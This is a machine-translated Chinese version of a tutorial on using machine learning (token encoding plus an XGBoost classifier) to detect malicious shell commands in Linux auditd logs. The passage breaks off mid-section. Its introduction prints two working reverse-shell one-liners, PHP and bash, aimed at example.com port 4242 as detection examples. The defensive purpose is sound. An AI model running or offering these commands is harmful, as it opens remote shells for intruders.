<html>
<head>
<title>Shell Language Processing: Intrusion Detection with TF-IDF and Hash Encoding on Linux auditd logs</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Shell语言处理:使用TF-IDF和哈希编码对Linux审计日志进行入侵检测</h1>
<blockquote>原文：<a href="https://towardsdatascience.com/shell-language-processing-machine-learning-for-security-intrusion-detection-with-linux-auditd-73d7196995c7#2022-09-22">https://towardsdatascience.com/shell-language-processing-machine-learning-for-security-intrusion-detection-with-linux-auditd-73d7196995c7#2022-09-22</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="b524" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">本文是一篇<em class="ki">操作指南</em>，为希望应用机器学习技术满足网络安全需求的安全专业人士和数据科学家提供代码示例。</h2></div><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi kj"><img src="../Images/9446b1c41e5784b2a8b54a128bc6b901.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*WVr4V6k0OBWKyf9p.png"/></div></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">图一。Kibana中已审核事件的屏幕。图片由作者拍摄。</p></figure><h1 id="1a25" class="kz la it bd lb lc ld le lf lg lh li lj jz lk ka ll kc lm kd ln kf lo kg lp lq bi translated">介绍</h1><p id="630f" class="pw-post-body-paragraph lr ls it lt b lu lv ju lw lx ly jx lz ma mb mc md me mf mg mh mi mj mk ml mm im bi translated">机器学习(ML)算法在行业、教程和课程中的适用性严重偏向于构建ML模型本身。然而，从我们的角度来看，数据<strong class="lt iu">预处理</strong>步骤(即，将文本系统日志转换为从数据中获取有价值见解的数字数组)对于试图将数据武器化的安全工程师和分析师来说，具有最大的心理和认知差距。</p><p id="e54a" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">有许多日志收集中心缺乏定性分析，无法从获取的数据中推断出必要的可见性。收集数TB的日志通常只是为了执行基本的分析(例如，基于签名的基本规则)，并且被认为是以一种<em class="ms">临时</em>反应式的方式使用—如果需要调查的话。一个没有足够分析注意力的有价值数据的例子——audited<strong class="lt iu">的<code class="fe mt mu mv mw b">execve</code> syscall包含上面图1中显示的Unix shell命令行。</strong></p><p id="aca7" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">通过在这些数据的基础上定义人工启发，可以获得许多有价值的推论。当<code class="fe mt mu mv mw b">pty </code>和<code class="fe mt mu mv mw b">spawn</code>被用在与<code class="fe mt mu mv mw b">/dev/shm</code>相同的<em class="ms">执行</em>调用或位置的参数中时，你一定要对出现的情况做出反应。然而，在许多情况下，定义一个在特定技术中易于变化的健壮的人工启发式方法是没有希望的。</p><p id="1e83" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">考虑这两个反向shell命令:</p><pre class="kk kl km kn gt mx mw my mz aw na bi"><span id="fb34" class="nb la it mw b gy nc nd l ne nf">php -r '$sock=fsockopen("example.com",4242);system("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><span id="ddf8" class="nb la it mw b gy ng nd l ne nf">bash -i &gt;&amp; /dev/tcp/example.com/4242 0&gt;&amp;1</span></pre><p id="9ec2" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">虽然我们在这两个定义中看到了一个共同的模式，但是检测其中一个的良好的基于规则的逻辑需要十几个带有正则表达式匹配的<em class="ms">和/或</em>语句。即使这样，威胁参与者也可以通过修改和引入中间变量名或重新分配文件描述符来逃避大多数手动方法。</p><p id="3364" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">在这篇文章中，我们提出了一个思维平面，其中使用<strong class="lt iu">机器学习(ML)来定义您的数据基线，作为基于规则的方法的扩展</strong>。ML允许决策边界的构建比手动试探法和直接从数据推断更加通用。我们将:</p><ul class=""><li id="1e6f" class="nh ni it lt b lu mn lx mo ma nj me nk mi nl mm nm nn no np bi translated">使用<code class="fe mt mu mv mw b">auditd</code> execve日志来检测<a class="ae nq" href="https://attack.mitre.org/techniques/T1059/004/" rel="noopener ugc nofollow" target="_blank"> T1059.004 </a>(命令和脚本解释器:Unix Shell)——这是滥用受损Unix主机的最常见方式；</li><li id="0798" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">讨论Unix shell命令的标记化和编码技术(TF-IDF &amp;“散列技巧”)；</li><li id="705a" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">使用<code class="fe mt mu mv mw b">scikit-learn</code>和<code class="fe mt mu mv mw b">nltk</code>库将命令编码为向量；</li><li id="389c" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">利用<code class="fe mt mu mv mw b">scikit-learn</code>和<code class="fe mt mu mv mw b">xgboost</code>库创建机器学习模型并训练监督分类器；</li><li id="01cd" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">讨论允许评估ML模型性能的度量标准；</li></ul><p id="341e" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">在本教程中，我们将<strong class="lt iu">而不是</strong>:</p><ul class=""><li id="b49c" class="nh ni it lt b lu mn lx mo ma nj me nk mi nl mm nm nn no np bi translated">讨论遥测基础设施设置，因此我们不包括<code class="fe mt mu mv mw b">auditd</code>配置。如果你想要一个好的起点，使用<a class="nw nx ep" href="https://medium.com/u/2fdc032a69b3?source=post_page-----73d7196995c7--------------------------------" rel="noopener" target="_blank"> Florian Roth </a>慷慨提供的<a class="ae nq" href="https://github.com/Neo23x0/auditd" rel="noopener ugc nofollow" target="_blank">这个配置</a>。</li><li id="69c1" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">介绍如何将这些数据提取到您的分析主机中——我们不介绍特定的工具API示例。我们遇到过存储在Elastic、Splunk和Spark集群中的此类数据，根据我们的观察，数据查询对从业者来说并不构成挑战。</li></ul><p id="55fd" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">如果您愿意考虑数据科学应用于网络安全需求的其他方面，请考虑以下相关主题的文章:</p><ul class=""><li id="d503" class="nh ni it lt b lu mn lx mo ma nj me nk mi nl mm nm nn no np bi translated"><a class="ae nq" rel="noopener" target="_blank" href="/data-centric-security-threat-hunting-based-on-zipfs-law-50ad919fc135">企业中基于统计模式的异常检测</a>；</li><li id="7918" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated"><a class="ae nq" href="https://medium.com/riga-data-science-club/transform-microsoft-xml-events-into-pandas-dataframe-11142501e7f9" rel="noopener">命令&amp;控制从Windows EventLog中检测熊猫</a>；</li><li id="8a04" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated"><a class="ae nq" href="https://ditrizna.medium.com/security-detections-on-windows-events-with-recurrent-neural-networks-346d0b2738fe" rel="noopener">用递归神经网络监督分析Sysmon事件</a>。</li></ul><h1 id="a08d" class="kz la it bd lb lc ld le lf lg lh li lj jz lk ka ll kc lm kd ln kf lo kg lp lq bi translated">形成数据集</h1><p id="9917" class="pw-post-body-paragraph lr ls it lt b lu lv ju lw lx ly jx lz ma mb mc md me mf mg mh mi mj mk ml mm im bi translated"><em class="ms"> auditd </em>(以及auditbeat等替代代理)在系统上提供各种类型的活动，例如，网络访问、文件系统操作或进程创建。后者是通过捕获<code class="fe mt mu mv mw b">execve</code> syscall的利用率获得的，根据配置的不同，这些事件可能看起来不同，但最终提供相同的信息:</p><figure class="kk kl km kn gt ko"><div class="bz fp l di"><div class="ny nz l"/></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">例1。审核的EXECVE系统调用日志。</p></figure><figure class="kk kl km kn gt ko"><div class="bz fp l di"><div class="ny nz l"/></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">例2。auditbeat报告的Auditd EXECVE系统调用日志。</p></figure><p id="ba36" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">在这个分析的范围内，我们建议把重点放在派生进程的命令行上。我们建议采用<em class="ms"> process.args </em>中表示的数组，并将其连接成一个字符串，因为:</p><ul class=""><li id="b242" class="nh ni it lt b lu mn lx mo ma nj me nk mi nl mm nm nn no np bi translated"><em class="ms"> process.title </em>值通常限制在128个字符以内，或者忽略不计；</li><li id="c0de" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated"><em class="ms"> process.args </em>经常提供不正确的“标记化”命令。</li></ul><p id="c134" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">我们对内部数据集的经验证明，使用本文描述的技术，<em class="ms"> process.args </em>提供的信息是非常高效的。然而，为了便于写作，我们收集了一个专用的开放数据集，由两部分组成:</p><ul class=""><li id="29aa" class="nh ni it lt b lu mn lx mo ma nj me nk mi nl mm nm nn no np bi translated"><a class="ae nq" href="https://github.com/TellinaTool/nl2bash/blob/master/data/bash/all.cm" rel="noopener ugc nofollow" target="_blank">合法命令</a>形成于NL2Bash数据集[ <a class="ae nq" href="https://aclanthology.org/L18-1491.pdf" rel="noopener ugc nofollow" target="_blank">林等2018 </a> ]其中包含来自quora等资源的废弃Unix shell命令；</li><li id="727c" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">真实的威胁参与者和渗透测试人员利用远离陆地的恶意活动来列举和利用Unix系统——我们专门为此研究从各种威胁情报和渗透测试资源中手动收集的数据集。</li></ul><h1 id="8ca1" class="kz la it bd lb lc ld le lf lg lh li lj jz lk ka ll kc lm kd ln kf lo kg lp lq bi translated">命令预处理</h1><p id="acbc" class="pw-post-body-paragraph lr ls it lt b lu lv ju lw lx ly jx lz ma mb mc md me mf mg mh mi mj mk ml mm im bi translated">机器学习模型期望编码数据(数字向量)作为其功能的输入。经典自然语言处理(NLP)管道的高级示例可能如下所示:</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oa"><img src="../Images/9e56740f265d427f304b70aba2b5df71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*jucLqat1NIrXAIPI.png"/></div></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">图二。经典NLP管道示意图。作者创造的形象。</p></figure><p id="29ed" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">可以说，shell命令行不需要像许多NLP应用程序那样清除标点符号，因为shell语法在标点符号中嵌入了很大一部分认知知识。但是，您可能仍需要根据收到的遥测信息执行不同类型的清理，例如，<em class="ms">域名、IP地址和用户名的规范化</em>。</p><p id="6d2c" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">将文本数据作为特征向量处理的关键步骤是<strong class="lt iu">标记化</strong>和<strong class="lt iu">编码</strong>，我们将在下面详细讨论。值得一提的是，多年来，传统的NLP应用程序开发了许多与shell遥测技术不太相关的其他技术，我们在本练习中省略了这些技术。</p><h2 id="25ad" class="nb la it bd lb ob oc dn lf od oe dp lj ma of og ll me oh oi ln mi oj ok lp ol bi translated">标记化</h2><p id="6b8b" class="pw-post-body-paragraph lr ls it lt b lu lv ju lw lx ly jx lz ma mb mc md me mf mg mh mi mj mk ml mm im bi translated">数据的预处理和编码高度依赖于字段和特定的数据源。记号化代表了<em class="ms">将任何连续序列分成称为记号的基本部分</em>的思想。应用于shell语法的标记化比我们在自然语言中看到的要复杂得多，并且带来了几个挑战:</p><ul class=""><li id="239b" class="nh ni it lt b lu mn lx mo ma nj me nk mi nl mm nm nn no np bi translated">空格并不总是元素分隔符；</li><li id="cbdc" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">点和逗号有专门的含义；</li><li id="7184" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">破折号、竖线、分号等标点符号后面的特定值。</li></ul><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oa"><img src="../Images/7d387e22e68b790ad1f92e011907574e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*V-2IMm0Q-JaTF_ET.png"/></div></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">图3。shell命令敏感部分的概要。作者创造的形象。</p></figure><p id="1725" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">我们可以使用作为我们的Shell语言处理(SLP)工具包的一部分实现的<code class="fe mt mu mv mw b">ShellTokenizer</code>类进行有效的标记化。我们已经证明，对shell命令行使用专用的标记器可以显著提高机器学习管道的性能。更多详情，请参考我们的论文<a class="ae nq" href="https://arxiv.org/abs/2107.02438" rel="noopener ugc nofollow" target="_blank">【Trizna 2021】</a>。</p><p id="a049" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">然而，SLP记号赋予器比许多优化的NLP记号赋予器更费时。因此，我们将使用来自<code class="fe mt mu mv mw b">nltk</code>图书馆的<code class="fe mt mu mv mw b">WordPunctTokenizer</code>对本文进行探索性分析。它保留了标点符号，并在应用于Unix shell命令时提供了一个不错的资源质量权衡。</p><h2 id="8416" class="nb la it bd lb ob oc dn lf od oe dp lj ma of og ll me oh oi ln mi oj ok lp ol bi translated">编码</h2><p id="0c2d" class="pw-post-body-paragraph lr ls it lt b lu lv ju lw lx ly jx lz ma mb mc md me mf mg mh mi mj mk ml mm im bi translated">一旦我们收到一个符号化的命令序列，我们就可以用数字的形式来表示这些序列。有多种方便的方法可以将文本标记序列表示为一个数字数组。我们将考虑:</p><ul class=""><li id="a58a" class="nh ni it lt b lu mn lx mo ma nj me nk mi nl mm nm nn no np bi translated">一个热点</li><li id="4ee6" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">词汇袋</li><li id="aaf3" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">“哈希技巧”矢量器</li><li id="d556" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">TF-IDF(术语频率-逆文档频率)</li></ul><p id="591f" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">我建议使用以下数据集建立编码方案背后的直觉:</p><pre class="kk kl km kn gt mx mw my mz aw na bi"><span id="2fe3" class="nb la it mw b gy nc nd l ne nf">1. I love dogs.<br/>2. I hate dogs and knitting.<br/>3. Knitting is my hobby and my passion.</span></pre><p id="128c" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">对于这样一个数据集，<a class="ae nq" href="https://scikit-learn.org/stable/modules/generated/sklearn.preprocessing.OneHotEncoder.html" rel="noopener ugc nofollow" target="_blank"> <strong class="lt iu"> One-Hot </strong> </a>编码看起来是这样的——只是表示特定输入中出现了什么单词:</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi om"><img src="../Images/f29fca52f607375865d78b2546cf21de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*QMomAytnJpR1ft4S.png"/></div></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">图4。单热点向量的简化视图。作者创造的形象。</p></figure><p id="0074" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated"><strong class="lt iu">单词包(BoW)(在的</strong>术语中又称为计数矢量器)编码看起来像这样——它对输入中的单独标记进行计数:</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi om"><img src="../Images/6f29a3a3d57710b5de7bf8aca1c9d184.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lTIP-CZqLENyqtrt.png"/></div></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">图5。单词袋(又名计数矢量器)向量的简化视图。作者创造的形象。</p></figure><p id="6792" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated"><a class="ae nq" href="https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.HashingVectorizer.html" rel="noopener ugc nofollow" target="_blank"> <strong class="lt iu">哈希矢量器</strong> </a>是一个“增强的”单词包，它执行令牌到哈希的映射。您失去了恢复令牌值的能力(因为哈希是一个单向函数)，但这大大减少了内存需求，并允许流学习。<a class="ae nq" href="https://kavita-ganesan.com/hashingvectorizer-vs-countvectorizer/#.YyCd9HZBy3B" rel="noopener ugc nofollow" target="_blank">【k . Ganesan】</a>对哈希矢量器背后的功能做了很好的解释。</p><p id="7ecf" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated"><a class="ae nq" href="https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.TfidfVectorizer.html" rel="noopener ugc nofollow" target="_blank"> <strong class="lt iu"> TF-IDF </strong> </a>是BoW的更高级版本，其中考虑了<em class="ms">其他</em>文档中的文字外观:</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi on"><img src="../Images/69e8ccb67c9af5b2f9b7a361d92eeeac.png" data-original-src="https://miro.medium.com/v2/resize:fit:800/format:webp/1*A7j00OjtL8pOuM7-A7OVCA.png"/></div></div></figure><p id="91f4" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">在示例样本数据集中，这将导致:</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oo"><img src="../Images/6095af87ec4dab359da2ca7cda11d3f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*tPbHV0EiDJVmewIL.png"/></div></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">图6。TF-IDF向量的简化视图。作者创造的形象。</p></figure><p id="09d1" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">与One-Hot和BoW相反，TF-IDF的基于频率的编码允许我们强调代表当前文档的标记，而不强调常见的标记。</p><p id="2c62" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">令人惊讶的是，<em class="ms">哈希矢量器</em>在一些安全应用上的表现明显优于TF-IDF。稍微脱离上下文，下面是分类任务的ROC曲线与我们上面的技术数据集(除了BoW)的比较:</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div class="gh gi op"><img src="../Images/892011fa3ad251e7a4bcd961ce00eb69.png" data-original-src="https://miro.medium.com/v2/resize:fit:744/format:webp/1*KHwTOr1A0C2wowIiJI-cOw.png"/></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">图7。不同编码方案的ROC曲线。作者创造的形象。</p></figure><p id="a215" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">我们看到<em class="ms">哈希矢量器</em>对TF-IDF和一键编码的结果之间存在差距，这意味着这种预处理方法产生了更好的分类结果。同样的“哈希技巧”优势也在其他安全问题中被注意到，例如，恶意软件分类<a class="ae nq" href="https://secret.inf.ufpr.br/2021/09/29/adversarial-machine-learning-malware-detection-and-the-2021s-mlsec-competition/" rel="noopener ugc nofollow" target="_blank">【Ceschin和Bota CIN 2021】</a>。因此，在处理您的数据时，我们建议同时使用TF-IDF和HashingVectorizer进行实验，并选择在验证集上产生最佳结果的一个。</p><p id="5626" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">基于上面的结果，在本文的范围内，我们将使用<em class="ms"> HashingVectorizer </em>和一个定制的标记器。在ML社区中，假设使用<strong class="lt iu"> X </strong>作为输入数据的符号。因此，可以使用<em class="ms"> sklearn </em>编码器和<em class="ms"> nltk </em>标记器从列表<code class="fe mt mu mv mw b">raw_commands</code>中获取“哈希技巧”和TF-IDF矩阵，如下所示(使用IP地址规范化):</p><figure class="kk kl km kn gt ko"><div class="bz fp l di"><div class="ny nz l"/></div></figure><p id="db79" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">此时，我们得到了一个编码数组——恭喜！</p><pre class="kk kl km kn gt mx mw my mz aw na bi"><span id="1e22" class="nb la it mw b gy nc nd l ne nf">&gt;&gt;&gt; print(X["HashingVectorizer"].shape)<br/>&gt;&gt;&gt; X["HashingVectorizer"][0:3].toarray()</span><span id="2766" class="nb la it mw b gy ng nd l ne nf">(12730, 262144)<br/>array([[0., 0., 0., ..., 0., 0., 0.],<br/>        [0., 0., 0., ..., 0., 0., 0.],<br/>        [0., 0., 0., ..., 0., 0., 0.]])</span></pre><p id="c83b" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">此外，当使用监督算法时，我们需要指定由<strong class="lt iu"> Y </strong>表示的数据标签来训练模型。在这种情况下，我们将标签0分配给良性条目，标签1代表恶意条目:</p><pre class="kk kl km kn gt mx mw my mz aw na bi"><span id="4dd4" class="nb la it mw b gy nc nd l ne nf">raw_commands <strong class="mw iu">=</strong> benign <strong class="mw iu">+</strong> malicious<br/>Y <strong class="mw iu">=</strong> np<strong class="mw iu">.</strong>array([0] <strong class="mw iu">*</strong> len(benign) <strong class="mw iu">+</strong> [1] <strong class="mw iu">*</strong> len(malicious), dtype<strong class="mw iu">=</strong>int)</span></pre><h1 id="6e53" class="kz la it bd lb lc ld le lf lg lh li lj jz lk ka ll kc lm kd ln kf lo kg lp lq bi translated">机器学习分类器</h1><h2 id="1940" class="nb la it bd lb ob oc dn lf od oe dp lj ma of og ll me oh oi ln mi oj ok lp ol bi translated">模型架构</h2><p id="d7e0" class="pw-post-body-paragraph lr ls it lt b lu lv ju lw lx ly jx lz ma mb mc md me mf mg mh mi mj mk ml mm im bi translated">此时，编码数据已准备好由许多机器学习模型进行处理。所以，让我们建立一个深度学习模型吧！？</p><p id="5b61" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">如果你想立即将数据输入神经网络，请与<a class="ae nq" href="https://c.tenor.com/gqsU87kq4PoAAAAM/no-no-please.gif" rel="noopener ugc nofollow" target="_blank">迈克</a>交谈。不要去神经网络，除非你知道为什么你需要深度学习。深度学习带来的问题通常会阻碍它们在生产环境中的部署:</p><ul class=""><li id="c0b4" class="nh ni it lt b lu mn lx mo ma nj me nk mi nl mm nm nn no np bi translated">需要一个大样本来学习一个好的分布(给定被监督的内容——你需要花很多钱来标记数据)</li><li id="3ff8" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm nm nn no np bi translated">需要明显更多的人力和计算资源来选择神经网络架构的适当配置。</li></ul><p id="95bb" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">因此，对于作为应用程序所有者的你来说，深度学习显然更加昂贵，并且如果上面的要点没有得到足够的重视，往往会产生更差的结果。</p><p id="4bdd" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">对于分类，我们建议首选是<strong class="lt iu">梯度提升决策树(GBDT) </strong>算法，具体是<code class="fe mt mu mv mw b">XGBoost</code>实现。</p><p id="aef1" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">事实证明，XGBoost是分类“表格数据”——固定长度的向量(我们的例子)——的黄金标准。此外，它还提供了最佳的精度和计算资源组合:</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oa"><img src="../Images/b8f3560f98dfe303a43ca69ee83428b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*UeBLwUVBgeN2EX8i.png"/></div></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">图8。基于表格数据准确性和训练时间的ML模型荟萃分析<a class="ae nq" href="https://arxiv.org/pdf/2110.01889.pdf" rel="noopener ugc nofollow" target="_blank">【博里索夫等2022】</a>。</p></figure><p id="40b1" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">很难在不专门写一篇文章的情况下描述boosted ensemble，但是分两步解释可能如下所示——( 1)每个决策树是一个if/else的训练序列；(2)我们做了一些聪明的操作来从许多树中得到一个单一的意见，其中每一个结果树都是基于先前树的错误来训练的。如果你想对GBDT有更深入的解释:<a class="ae nq" href="https://en.wikipedia.org/wiki/Gradient_boosting" rel="noopener ugc nofollow" target="_blank"> 1。维基。</a>2<a class="ae nq" href="https://arogozhnikov.github.io/2016/06/24/gradient_boosting_explained.html" rel="noopener ugc nofollow" target="_blank">2。直觉&amp;观想</a>。</p><p id="48b6" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">模型的训练使用<code class="fe mt mu mv mw b">fit()</code>方法完成，预测可以使用<code class="fe mt mu mv mw b">predict()</code>(给出标签—恶意或良性)或<code class="fe mt mu mv mw b">predict_proba()</code>(返回概率):</p><figure class="kk kl km kn gt ko"><div class="bz fp l di"><div class="ny nz l"/></div></figure><p id="aebc" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">上面的脚本块的输出给出了下面的数组:<code class="fe mt mu mv mw b">array([[0.1696732, <strong class="lt iu">0.8303268</strong>]], dtype=float32)</code></p><p id="5d53" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">这里我们看到调用后门下载和后台执行的shellshock被一个概率为<strong class="lt iu"> 0.8303268 </strong>的模型认为是恶意的。如果我们将决策阈值定义为经典的0.5，这意味着更高的概率导致恶意得分，那么我们的数据集与<em class="ms">哈希矢量器</em>的混淆矩阵如下所示:</p><figure class="kk kl km kn gt ko gh gi paragraph-image"><div role="button" tabindex="0" class="kp kq di kr bf ks"><div class="gh gi oq"><img src="../Images/314d611c8f513b04689b9f81a3a5a4b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:706/format:webp/1*FJ4xj3aISAyQw3MefbNfhA.png"/></div></div><p class="kv kw gj gh gi kx ky bd b be z dk translated">图9。使用哈希矢量器预处理方案的分类器训练集上的混淆矩阵。作者创造的形象。</p></figure><h1 id="8f81" class="kz la it bd lb lc ld le lf lg lh li lj jz lk ka ll kc lm kd ln kf lo kg lp lq bi translated">检测工程框架</h1><p id="2d1b" class="pw-post-body-paragraph lr ls it lt b lu lv ju lw lx ly jx lz ma mb mc md me mf mg mh mi mj mk ml mm im bi translated">此时，我们的模型已准备好进行部署，作为检测可疑活动的基础:</p><ol class=""><li id="b726" class="nh ni it lt b lu mn lx mo ma nj me nk mi nl mm or nn no np bi translated">用ML模型将<em class="ms"> auditd </em>日志流提取到分析主机；</li><li id="6d51" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm or nn no np bi translated">从一个<em class="ms"> auditd </em>事件中解析<em class="ms">process . args</em>；</li><li id="e091" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm or nn no np bi translated">标记器&amp;用选定的预处理方法对<em class="ms"> args </em>进行编码，并将其提供给模型的<code class="fe mt mu mv mw b">predict_proba()</code>方法；</li><li id="94ae" class="nh ni it lt b lu nr lx ns ma nt me nu mi nv mm or nn no np bi translated">如果恶意性超过概率阈值，则向SIEM/吉拉/SOAR/Slack报告。</li></ol><p id="96b0" class="pw-post-body-paragraph lr ls it lt b lu mn ju lw lx mo jx lz ma mp mc md me mq mg mh mi mr mk ml mm im bi translated">附加说明—在本文中，我们试图在恶意命令和良性命令之间建立一个决策界限。然而，这通常会适得其反，我们建议形成一个数据集，因此ML模型侧重于狭窄的TTP，例如，仅(1)反向外壳检测或(2)被入侵机器的枚举。</p><h2 id="887f" class="nb la it bd lb ob oc dn lf od oe dp lj ma of og ll me oh oi ln mi oj ok lp ol bi translated">在线学习—减少误报</h2><p id="1c0d" class="pw-post-body-paragraph lr ls it lt b lu lv ju lw lx ly jx lz ma mb mc md me mf mg mh mi mj mk ml mm im bi 